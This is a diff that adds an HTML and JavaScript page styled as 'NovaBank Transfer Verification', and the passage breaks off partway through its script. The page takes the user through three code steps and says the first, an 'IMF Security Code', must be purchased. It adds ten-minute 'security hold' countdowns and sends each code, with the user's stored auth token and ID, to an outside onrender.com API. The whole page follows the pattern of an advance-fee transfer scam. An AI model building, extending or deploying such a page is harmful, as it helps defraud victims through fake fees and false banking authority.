@@ -1,0 +1,999 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NovaBank - Transfer Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: #0A0A0F;
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+        }
+        
+        .font-display {
+            font-family: 'Space Grotesk', sans-serif;
+        }
+        
+        .glass {
+            background: rgba(26, 26, 46, 0.7);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .glass-card {
+            background: linear-gradient(135deg, rgba(26, 26, 46, 0.9) 0%, rgba(22, 33, 62, 0.9) 100%);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(0, 212, 255, 0.2);
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #00D4FF 0%, #0099CC 100%);
+            transition: all 0.3s ease;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 40px rgba(0, 212, 255, 0.4);
+        }
+        
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        @keyframes pulse-glow {
+            0%, 100% { box-shadow: 0 0 20px rgba(0, 212, 255, 0.3); }
+            50% { box-shadow: 0 0 40px rgba(0, 212, 255, 0.6); }
+        }
+        
+        .animate-glow {
+            animation: pulse-glow 3s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 3px solid #00D4FF;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        
+        .step-container {
+            display: none;
+            animation: fadeIn 0.5s ease-out;
+        }
+        
+        .step-container.active {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.4;
+        }
+        
+        .code-input {
+            letter-spacing: 0.3em;
+            text-align: center;
+            font-size: 1.2rem;
+            font-family: 'Space Grotesk', monospace;
+        }
+        
+        .code-input.error {
+            border-color: #ef4444;
+            animation: shake 0.5s;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        
+        .timer-display {
+            font-variant-numeric: tabular-nums;
+        }
+        
+        .waiting-state {
+            opacity: 0.3;
+            pointer-events: none;
+            filter: blur(2px);
+            transition: all 0.5s ease;
+        }
+        
+        .active-state {
+            opacity: 1;
+            pointer-events: all;
+            filter: blur(0);
+            animation: unlockPulse 0.6s ease;
+        }
+        
+        @keyframes unlockPulse {
+            0% { transform: scale(0.95); opacity: 0.5; }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .countdown-box {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1) 0%, rgba(0, 153, 204, 0.1) 100%);
+            border: 1px solid rgba(0, 212, 255, 0.3);
+        }
+    </style>
+</head>
+<body class="text-white relative overflow-x-hidden">
+
+    <!-- Background Effects -->
+    <div class="fixed inset-0 overflow-hidden pointer-events-none z-0">
+        <div class="orb w-96 h-96 bg-blue-500/20 top-0 left-0"></div>
+        <div class="orb w-80 h-80 bg-purple-500/20 bottom-0 right-0"></div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="relative z-10 min-h-screen flex items-center justify-center p-4">
+        
+        <!-- Transfer Verification Card -->
+        <div class="glass-card rounded-3xl p-8 w-full max-w-lg animate-glow">
+            
+            <!-- Header -->
+            <div class="text-center mb-8">
+                <div class="w-16 h-16 mx-auto mb-4 bg-gradient-to-br from-cyan-400 to-blue-600 rounded-2xl flex items-center justify-center">
+                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+                    </svg>
+                </div>
+                <h1 class="font-display text-2xl font-bold mb-2">Transfer Verification</h1>
+                <p class="text-gray-400 text-sm">Secure your transaction with verification codes</p>
+            </div>
+
+            <!-- Loading State -->
+            <div id="loading" class="hidden text-center py-8">
+                <div class="spinner mx-auto mb-4"></div>
+                <p class="text-gray-400" id="loadingText">Verifying...</p>
+            </div>
+
+            <!-- Step 1: IMF Code -->
+            <div id="step1" class="step-container active">
+                <div class="text-center mb-6">
+                    <div class="w-32 h-32 mx-auto mb-4 rounded-2xl overflow-hidden bg-white/5 flex items-center justify-center border border-cyan-500/30">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/69/IMF_logo.svg/1200px-IMF_logo.svg.png" 
+                             alt="IMF Logo" 
+                             class="w-24 h-24 object-contain opacity-80"
+                             onerror="this.style.display='none'; this.parentElement.innerHTML='<svg class=\'w-16 h-16 text-cyan-400\' fill=\'none\' stroke=\'currentColor\' viewBox=\'0 0 24 24\'><path stroke-linecap=\'round\' stroke-linejoin=\'round\' stroke-width=\'2\' d=\'M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z\'/></svg>';">
+                    </div>
+                    <h2 class="font-display text-xl font-semibold mb-2 text-cyan-400">IMF Security Code</h2>
+                    <p class="text-gray-400 text-sm mb-4">
+                        Enter the IMF verification code provided by your support to initiate the transfer.
+                    </p>
+                    <p class="text-gray-400 text-sm mb-4">The code is a purchasable code costing a sum of <span></span> for the completion of your transfer..</p>
+                    <div class="inline-flex items-center gap-2 px-4 py-2 bg-yellow-500/10 rounded-full border border-yellow-500/30">
+                        <svg class="w-4 h-4 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
+                        </svg>
+                        <span class="text-xs text-yellow-400">Step 1 of 3</span>
+                    </div>
+                </div>
+
+                <div class="space-y-4">
+                    <div>
+                        <label class="text-sm text-gray-400 mb-2 block text-center">Enter IMF Serial Code</label>
+                        <input type="text" 
+                               id="input1" 
+                               class="code-input w-full bg-white/5 border border-gray-700 rounded-xl px-4 py-4 focus:border-cyan-400 focus:outline-none transition-all uppercase"
+                               placeholder="XXX-XXXX-XXXXXX"
+                               maxlength="17">
+                        <p class="text-xs text-gray-500 mt-2 text-center">Format: Letters and numbers (e.g., ABC-1234-DEF)</p>
+                        <p id="error1" class="text-xs text-red-400 mt-2 text-center hidden"></p>
+                    </div>
+                    <button id="btn1" class="btn-primary w-full py-4 rounded-xl font-semibold flex items-center justify-center gap-2">
+                        <span>Verify IMF Code</span>
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Step 2: Transaction Failure Code -->
+            <div id="step2" class="step-container">
+                <div class="text-center mb-6">
+                    <div class="w-32 h-32 mx-auto mb-4 rounded-2xl overflow-hidden bg-white/5 flex items-center justify-center border border-orange-500/30">
+                        <svg class="w-16 h-16 text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
+                        </svg>
+                    </div>
+                    <h2 class="font-display text-xl font-semibold mb-2 text-orange-400">Transaction Failure Code</h2>
+                    <p class="text-gray-400 text-sm mb-4">
+                        Security hold active. The failure prevention code input will unlock after the security period.
+                    </p>
+                    
+                    <!-- Countdown Display -->
+                    <div id="countdownContainer2" class="countdown-box inline-flex items-center gap-3 px-6 py-3 rounded-xl mb-4">
+                        <div class="relative">
+                            <svg class="w-6 h-6 text-cyan-400 animate-spin" style="animation-duration: 3s;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                            </svg>
+                            <div class="absolute inset-0 bg-cyan-400/20 blur-lg rounded-full"></div>
+                        </div>
+                        <div class="text-left">
+                            <div class="text-xs text-gray-400 uppercase tracking-wider">Time Remaining</div>
+                            <div class="text-2xl font-mono font-bold text-cyan-400 timer-display" id="timer2">10:00</div>
+                        </div>
+                    </div>
+                    
+                    <div class="inline-flex items-center gap-2 px-4 py-2 bg-orange-500/10 rounded-full border border-orange-500/30">
+                        <span class="text-xs text-orange-400">Step 2 of 3</span>
+                    </div>
+                </div>
+
+                <div id="inputContainer2" class="space-y-4 waiting-state">
+                    <div class="bg-green-500/10 border border-green-500/30 rounded-xl p-4 mb-4">
+                        <div class="flex items-center gap-2 text-green-400">
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 11V7a4 4 0 118 0m-4 8v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2z"/>
+                            </svg>
+                            <span class="text-sm font-semibold">Input Unlocked</span>
+                        </div>
+                    </div>
+                    <div>
+                        <label class="text-sm text-gray-400 mb-2 block text-center">Enter Failure Prevention Code</label>
+                        <input type="text" 
+                               id="input2" 
+                               class="code-input w-full bg-white/5 border border-gray-700 rounded-xl px-4 py-4 focus:border-orange-400 focus:outline-none transition-all uppercase"
+                               placeholder="XXX-XXXX-XXX"
+                               maxlength="17">
+                        <p class="text-xs text-gray-500 mt-2 text-center">Format: Letters and numbers (e.g., XYZ-5678-ABC)</p>
+                        <p id="error2" class="text-xs text-red-400 mt-2 text-center hidden"></p>
+                    </div>
+                    <button id="btn2" class="w-full py-4 rounded-xl font-semibold flex items-center justify-center gap-2 bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-400 hover:to-red-400 transition-all transform hover:scale-[1.02]">
+                        <span>Verify Failure Code</span>
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+                </div>
+                
+                <div id="waitingMessage2" class="text-center py-8 bg-white/5 rounded-xl border border-white/10 mt-4">
+                    <div class="flex flex-col items-center gap-3">
+                        <div class="w-12 h-12 rounded-full bg-cyan-500/20 flex items-center justify-center animate-pulse">
+                            <svg class="w-6 h-6 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+                            </svg>
+                        </div>
+                        <p class="text-sm text-gray-400">Security hold active</p>
+                        <p class="text-xs text-gray-500">Please wait for the countdown to complete</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step 3: Authorization Code -->
+            <div id="step3" class="step-container">
+                <div class="text-center mb-6">
+                    <div class="w-32 h-32 mx-auto mb-4 rounded-2xl overflow-hidden bg-white/5 flex items-center justify-center border border-purple-500/30">
+                        <svg class="w-16 h-16 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                        </svg>
+                    </div>
+                    <h2 class="font-display text-xl font-semibold mb-2 text-purple-400">Authorization Code</h2>
+                    <p class="text-gray-400 text-sm mb-4">
+                        Final verification step. Complete the security period to unlock the authorization input.
+                    </p>
+                    
+                    <!-- Countdown Display -->
+                    <div id="countdownContainer3" class="countdown-box inline-flex items-center gap-3 px-6 py-3 rounded-xl mb-4">
+                        <div class="relative">
+                            <svg class="w-6 h-6 text-cyan-400 animate-spin" style="animation-duration: 3s;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                            </svg>
+                            <div class="absolute inset-0 bg-cyan-400/20 blur-lg rounded-full"></div>
+                        </div>
+                        <div class="text-left">
+                            <div class="text-xs text-gray-400 uppercase tracking-wider">Time Remaining</div>
+                            <div class="text-2xl font-mono font-bold text-cyan-400 timer-display" id="timer3">10:00</div>
+                        </div>
+                    </div>
+                    
+                    <div class="inline-flex items-center gap-2 px-4 py-2 bg-green-500/10 rounded-full border border-green-500/30">
+                        <svg class="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
+                        </svg>
+                        <span class="text-xs text-green-400">Step 3 of 3</span>
+                    </div>
+                </div>
+
+                <div id="inputContainer3" class="space-y-4 waiting-state">
+                    <div class="bg-green-500/10 border border-green-500/30 rounded-xl p-4 mb-4">
+                        <div class="flex items-center gap-2 text-green-400">
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 11V7a4 4 0 118 0m-4 8v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2z"/>
+                            </svg>
+                            <span class="text-sm font-semibold">Input Unlocked</span>
+                        </div>
+                    </div>
+                    <div>
+                        <label class="text-sm text-gray-400 mb-2 block text-center">Enter Authorization Code</label>
+                        <input type="text" 
+                               id="input3" 
+                               class="code-input w-full bg-white/5 border border-gray-700 rounded-xl px-4 py-4 focus:border-purple-400 focus:outline-none transition-all uppercase"
+                               placeholder="XXXX-XXXXXX-XXXX"
+                               maxlength="17">
+                        <p class="text-xs text-gray-500 mt-2 text-center">Format: Letters and numbers (e.g., QRS-9012-TUV)</p>
+                        <p id="error3" class="text-xs text-red-400 mt-2 text-center hidden"></p>
+                    </div>
+                    <button id="btn3" class="w-full py-4 rounded-xl font-semibold flex items-center justify-center gap-2 bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-400 hover:to-pink-400 transition-all transform hover:scale-[1.02]">
+                        <span>Complete Transfer</span>
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
+                        </svg>
+                    </button>
+                </div>
+                
+                <div id="waitingMessage3" class="text-center py-8 bg-white/5 rounded-xl border border-white/10 mt-4">
+                    <div class="flex flex-col items-center gap-3">
+                        <div class="w-12 h-12 rounded-full bg-cyan-500/20 flex items-center justify-center animate-pulse">
+                            <svg class="w-6 h-6 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+                            </svg>
+                        </div>
+                        <p class="text-sm text-gray-400">Security hold active</p>
+                        <p class="text-xs text-gray-500">Please wait for the countdown to complete</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Success State -->
+            <div id="success" class="step-container">
+                <div class="text-center py-8">
+                    <div class="w-24 h-24 mx-auto mb-6 rounded-full bg-green-500/20 flex items-center justify-center animate-bounce">
+                        <svg class="w-12 h-12 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/>
+                        </svg>
+                    </div>
+                    <h2 class="font-display text-2xl font-bold mb-2 text-green-400">Transfer Authorized</h2>
+                    <p class="text-gray-400 mb-6">
+                        All verification codes have been validated successfully. Your transfer is now being processed.
+                    </p>
+                    <div class="glass rounded-xl p-4 mb-6 text-left">
+                        <div class="flex justify-between mb-2">
+                            <span class="text-gray-400 text-sm">Transaction ID</span>
+                            <span class="text-white font-mono text-sm" id="transactionId">#TRX-789456123</span>
+                        </div>
+                        <div class="flex justify-between mb-2">
+                            <span class="text-gray-400 text-sm">Status</span>
+                            <span class="text-green-400 text-sm">Processing</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-400 text-sm">Estimated Completion</span>
+                            <span class="text-white text-sm">24-48 hours</span>
+                        </div>
+                    </div>
+                    <!-- <button onclick="resetProcess()" class="btn-primary w-full py-4 rounded-xl font-semibold">
+                        Start New Transfer
+                    </button> -->
+                </div>
+            </div>
+
+            <!-- Footer -->
+            <div class="mt-8 pt-6 border-t border-gray-800">
+                <div class="flex items-center justify-center gap-4 text-xs text-gray-500">
+                    <div class="flex items-center gap-1">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+                        </svg>
+                        <span>256-bit Encryption</span>
+                    </div>
+                    <div class="w-1 h-1 bg-gray-600 rounded-full"></div>
+                    <div class="flex items-center gap-1">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+                        </svg>
+                        <span>Secure API</span>
+                    </div>
+                </div>
+                <p class="text-center text-xs text-gray-600 mt-4">
+                    © 2026 NovaBank. All rights reserved.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // NOVABANK VERIFICATION SYSTEM
+        // INTEGRATED WITH: https://appbanking.onrender.com/api/v1/user/inputSerials
+        // ==========================================
+        
+        const CONFIG = {
+            // API Configuration - Your endpoint
+            API: {
+                BASE_URL: 'https://appbanking.onrender.com/api/v1',
+                ENDPOINT: '/user/inputSerials',
+                METHOD: 'PUT'
+            },
+            
+            // Security Settings
+            SECURITY: {
+                COUNTDOWN_DURATION: 10 * 60, // 10 minutes in seconds (600 seconds)
+            },
+            
+            // Code Format
+            CODE_FORMAT: 'XXXX-XXXXX-XXXX',
+            
+            // Storage Keys
+            STORAGE_KEY: 'novabank_verification_state',
+            TIMER_KEY_STEP2: 'novabank_timer_step2',
+            TIMER_KEY_STEP3: 'novabank_timer_step3',
+            TOKEN_KEY: 'novabank_token', // Change this to match your token storage key
+            USER_ID_KEY: 'user_id'    // Change this to match your user ID storage key
+        };
+
+        // ==========================================
+        // UTILITY FUNCTIONS
+        // ==========================================
+        
+        // Get auth token from your storage (localStorage/sessionStorage/cookie)
+        function getAuthToken() {
+            // Option 1: localStorage
+            return localStorage.getItem(CONFIG.TOKEN_KEY) || 
+                   // Option 2: sessionStorage
+                   sessionStorage.getItem('token') ||
+                   // Option 3: cookie
+                   document.cookie.split('; ').find(row => row.startsWith('token='))?.split('=')[1] ||
+                   // Option 4: global variable (if set by your app)
+                   (typeof authToken !== 'undefined' ? authToken : null);
+        }
+
+        // Get user ID from your storage
+        function getUserId() {
+            // Option 1: localStorage
+            return localStorage.getItem(CONFIG.USER_ID_KEY) ||
+                   // Option 2: sessionStorage  
+                   sessionStorage.getItem('userId') ||
+                   // Option 3: from token payload (JWT)
+                   getUserIdFromToken() ||
+                   // Option 4: global variable
+                   (typeof userDataID !== 'undefined' ? userDataID : null);
+        }
+
+        // Extract user ID from JWT token if stored that way
+        function getUserIdFromToken() {
+            const token = getAuthToken();
+            if (!token) return null;
+            try {
+                const payload = JSON.parse(atob(token.split('.')[1]));
+                return payload.userId || payload.id || payload.sub;
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // ==========================================
+        // STATE MANAGEMENT
+        // ==========================================
+        
+        const StateManager = {
+            getState() {
+                try {
+                    const saved = localStorage.getItem(CONFIG.STORAGE_KEY);
+                    if (saved) return JSON.parse(saved);
+                } catch (e) {
+                    console.error('Error reading state:', e);
+                }
+                
+                return {
+                    currentStep: 1,
+                    step1Completed: false,
+                    step2Completed: false,
+                    step3Completed: false,
+                    step2AvailableAt: null,
+                    step3AvailableAt: null,
+                    step1Code: '',
+                    step2Code: '',
+                    step3Code: ''
+                };
+            },
+
+            saveState(state) {
+                try {
+                    localStorage.setItem(CONFIG.STORAGE_KEY, JSON.stringify(state));
+                } catch (e) {
+                    console.error('Error saving state:', e);
+                }
+            },
+
+            clearState() {
+                localStorage.removeItem(CONFIG.STORAGE_KEY);
+                localStorage.removeItem(CONFIG.TIMER_KEY_STEP2);
+                localStorage.removeItem(CONFIG.TIMER_KEY_STEP3);
+            },
+
+            setTimer(timerKey, durationSeconds) {
+                const targetTime = Date.now() + (durationSeconds * 1000);
+                localStorage.setItem(timerKey, targetTime.toString());
+                return targetTime;
+            },
+
+            getTimer(timerKey) {
+                return parseInt(localStorage.getItem(timerKey) || '0');
+            }
+        };
+
+        // ==========================================
+        // TIMER MANAGEMENT
+        // ==========================================
+        
+        const TimerManager = {
+            intervals: {},
+
+            start(timerId, displayId, inputContainerId, waitingMsgId, onComplete) {
+                if (this.intervals[timerId]) clearInterval(this.intervals[timerId]);
+
+                const targetTime = StateManager.getTimer(timerId);
+                const now = Date.now();
+
+                // If no timer set or expired, enable immediately
+                if (!targetTime || now >= targetTime) {
+                    this.enableInput(inputContainerId, waitingMsgId);
+                    document.getElementById(displayId).textContent = "00:00";
+                    if (onComplete) onComplete();
+                    return;
+                }
+
+                // Timer is active - disable input and start countdown
+                this.disableInput(inputContainerId, waitingMsgId);
+                
+                const updateDisplay = () => {
+                    const remaining = Math.ceil((targetTime - Date.now()) / 1000);
+
+                    if (remaining <= 0) {
+                        clearInterval(this.intervals[timerId]);
+                        delete this.intervals[timerId];
+                        document.getElementById(displayId).textContent = "00:00";
+                        this.enableInput(inputContainerId, waitingMsgId);
+                        if (onComplete) onComplete();
+                        return;
+                    }
+
+                    const minutes = Math.floor(remaining / 60);
+                    const seconds = remaining % 60;
+                    document.getElementById(displayId).textContent = 
+                        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                };
+
+                updateDisplay();
+                this.intervals[timerId] = setInterval(updateDisplay, 1000);
+            },
+
+            stopAll() {
+                Object.values(this.intervals).forEach(clearInterval);
+                this.intervals = {};
+            },
+
+            disableInput(containerId, msgId) {
+                const container = document.getElementById(containerId);
+                const msg = document.getElementById(msgId);
+                if (container) {
+                    container.classList.remove('active-state');
+                    container.classList.add('waiting-state');
+                }
+                if (msg) msg.classList.remove('hidden');
+            },
+
+            enableInput(containerId, msgId) {
+                const container = document.getElementById(containerId);
+                const msg = document.getElementById(msgId);
+                if (container) {
+                    container.classList.remove('waiting-state');
+                    container.classList.add('active-state');
+                }
+                if (msg) msg.classList.add('hidden');
+            }
+        };
+
+        // ==========================================
+        // UI MANAGEMENT
+        // ==========================================
+        
+        const UIManager = {
+            showStep(stepId) {
+                document.querySelectorAll('.step-container').forEach(el => el.classList.remove('active'));
+                document.getElementById(stepId)?.classList.add('active');
+            },
+
+            showLoading(message = 'Verifying...') {
+                document.querySelectorAll('.step-container').forEach(el => el.classList.remove('active'));
+                document.getElementById('loadingText').textContent = message;
+                document.getElementById('loading').classList.remove('hidden');
+            },
+
+            hideLoading() {
+                document.getElementById('loading').classList.add('hidden');
+            },
+
+            showError(message, step) {
+                this.hideLoading();
+                const errorEl = document.getElementById(`error${step}`);
+                if (errorEl) {
+                    errorEl.textContent = message;
+                    errorEl.classList.remove('hidden');
+                }
+                
+                const input = document.getElementById(`input${step}`);
+                if (input) {
+                    input.classList.add('error');
+                    setTimeout(() => input.classList.remove('error'), 500);
+                }
+            },
+            
+
+            clearError(step) {
+                const errorEl = document.getElementById(`error${step}`);
+                if (errorEl) {
+                    errorEl.textContent = '';
+                    errorEl.classList.add('hidden');
+                }
+            },
+
+            setButtonLoading(btnId, loading = true) {
+                const btn = document.getElementById(btnId);
+                if (!btn) return;
+                
+                if (loading) {
+                    btn.disabled = true;
+                    btn.innerHTML = '<span>Loading...</span><div class="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin ml-2"></div>';
+                } else {
+                    btn.disabled = false;
+                    const step = btnId.replace('btn', '');
+                    const labels = { '1': 'Verify IMF Code', '2': 'Verify Failure Code', '3': 'Complete Transfer' };
+                    const icons = {
+                        '1': '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/></svg>',
+                        '2': '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/></svg>',
+                        '3': '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>'
+                    };
+                    btn.innerHTML = `<span>${labels[step]}</span>${icons[step]}`;
+                }
+            },
+
+formatSerialInput(input) {
+    let value = input.value.replace(/[^A-Za-z0-9]/g, '').toUpperCase().slice(0, 13);
+    
+    // Store raw value (without dashes)
+    input.dataset.rawValue = value;
+    
+    // Format with dashes for display: XXX-XXXX-XXXXXX (3-4-6)
+    if (value.length > 7) {
+        input.value = value.slice(0, 3) + '-' + value.slice(3, 7) + '-' + value.slice(7);
+    } else if (value.length > 3) {
+        input.value = value.slice(0, 3) + '-' + value.slice(3);
+    } else {
+        input.value = value;
+    }
+}
+        };
+
+// ==========================================
+// API SERVICE - Your Endpoint Integration
+// ==========================================
+        
+const APIService = {
+    async verifySerial(step, inputElement) {  // <-- inputElement is the parameter
+        const token = getAuthToken();
+        const userId = getUserId();
+
+        if (!token) {
+            throw new Error('Authentication required. Please log in again.');
+        }
+
+        if (!userId) {
+            throw new Error('User ID not found. Please log in again.');
+        }
+
+        // Get raw value (without dashes) from dataset
+        const rawSerialCode = inputElement.dataset.rawValue || inputElement.value.replace(/-/g, '');
+
+        // Build request body: { userId: "...", serialNumber1: "5650879317XRM" }
+        const requestBody = {
+            userId: userId,
+            [`serialNumber${step}`]: rawSerialCode
+        };
+
+        const response = await fetch(`${CONFIG.API.BASE_URL}${CONFIG.API.ENDPOINT}`, {
+            method: CONFIG.API.METHOD,
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${token}`
+            },
+            body: JSON.stringify(requestBody)
+        });
+
+        const data = await response.json();
+
+        if (!response.ok) {
+            throw new Error(data.message || `Failed to verify code (Step ${step})`);
+        }
+
+        return data;
+    }
+};
+        // ==========================================
+        // VERIFICATION CONTROLLER
+        // ==========================================
+        
+        const VerificationController = {
+            state: null,
+
+            init() {
+                this.state = StateManager.getState();
+                this.attachEventListeners();
+                this.restoreState();
+            },
+
+            attachEventListeners() {
+                ['input1', 'input2', 'input3'].forEach(id => {
+                    const input = document.getElementById(id);
+                    if (input) {
+                        input.addEventListener('input', () => {
+                            UIManager.formatSerialInput(input);
+                            UIManager.clearError(id.replace('input', ''));
+                        });
+                    }
+                });
+
+                document.getElementById('btn1')?.addEventListener('click', () => this.handleStep1());
+                document.getElementById('btn2')?.addEventListener('click', () => this.handleStep2());
+                document.getElementById('btn3')?.addEventListener('click', () => this.handleStep3());
+            },
+
+            restoreState() {
+                if (this.state.step3Completed) {
+                    UIManager.showStep('success');
+                    return;
+                }
+
+                if (this.state.step2Completed) {
+                    UIManager.showStep('step3');
+                    if (this.state.step3AvailableAt) {
+                        StateManager.setTimer(CONFIG.TIMER_KEY_STEP3, 
+                            Math.ceil((this.state.step3AvailableAt - Date.now()) / 1000));
+                    }
+                    TimerManager.start(CONFIG.TIMER_KEY_STEP3, 'timer3', 'inputContainer3', 'waitingMessage3', null);
+                    return;
+                }
+
+                if (this.state.step1Completed) {
+                    UIManager.showStep('step2');
+                    if (this.state.step2AvailableAt) {
+                        StateManager.setTimer(CONFIG.TIMER_KEY_STEP2,
+                            Math.ceil((this.state.step2AvailableAt - Date.now()) / 1000));
+                    }
+                    TimerManager.start(CONFIG.TIMER_KEY_STEP2, 'timer2', 'inputContainer2', 'waitingMessage2', null);
+                    return;
+                }
+
+                UIManager.showStep('step1');
+            },
+
